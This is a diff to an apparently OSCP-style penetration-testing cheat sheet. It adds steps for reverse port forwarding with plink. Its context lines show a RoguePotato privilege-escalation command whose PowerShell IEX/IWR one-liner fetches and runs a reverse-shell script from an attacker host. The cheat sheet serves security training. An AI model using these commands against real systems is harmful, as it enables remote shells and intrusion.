@@ -815,6 +815,16 @@ On local machine:
 Set up a Python server to transfer powershell payload over and a netcat listner. \
 On target machine: ```.\RoguePotato.exe -r 10.10.14.x -e "powershell IEX( IWR http://10.10.14.x:6666/rev.ps1 -UseBasicParsing)" -l 9000```
 
+**Port forwarding for privilege escalation**
+
+If a service is listening locally only, or the firewall blocks a specific incoming port.\
+We can port forward with plink.exe\
+```plink.exe root@$LHOST -R  8080:127.0.0.1:8080```: forward a remote port to a local port, the first 8080 is the port on kali, second 8080 is the victim's port to forward to.\
+Make sure Kali's SSH can be accessed with root.\
+Now, 8080 on Kali is being forwarded to the target's 8080 over the SSH connection.\
+https://github.com/backlion/Offensive-Security-OSCP-Cheatsheets/blob/master/offensive-security/ssh-tunnelling-port-forwarding.md
+
+
 If Windows 7 is detected, check for potential Eternal Blue or Kernel Exploit.
 
 https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#privilege-escalation
